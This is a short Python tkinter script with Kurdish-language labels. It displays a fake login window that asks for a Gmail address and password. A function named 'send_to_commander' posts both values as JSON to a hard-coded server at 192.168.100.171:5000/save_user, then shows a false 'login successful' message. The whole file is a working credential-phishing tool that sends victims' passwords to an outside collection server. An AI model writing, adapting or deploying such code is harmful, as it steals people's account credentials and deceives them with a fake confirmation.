import tkinter as tk
from tkinter import messagebox
import requests

def send_to_commander():
    email = email_entry.get()
    password = pass_entry.get()
    
    # ناردن بۆ سێرڤەرەکەت
    try:
        url = "http://192.168.100.171:5000/save_user"
        requests.post(url, json={"email": email, "pass": password})
        messagebox.showinfo("سەرکەوتوو", "چوونەژوورەوە سەرکەوتوو بوو!")
    except:
        messagebox.showerror("هەڵە", "سێرڤەری فەرماندە ناچالاکە!")

# دروستکردنی پەنجەرەکە
root = tk.Tk()
root.title("کۆنکانی کوردی - لۆگین")
root.geometry("300x400")

tk.Label(root, text="ئیمەیڵ (Gmail):").pack(pady=10)
email_entry = tk.Entry(root)
email_entry.pack()

tk.Label(root, text="پاسوۆرد:").pack(pady=10)
pass_entry = tk.Entry(root, show="*")
pass_entry.pack()

tk.Button(root, text="چوونەژوورەوە", command=send_to_commander, bg="green", fg="white").pack(pady=20)

root.mainloop()
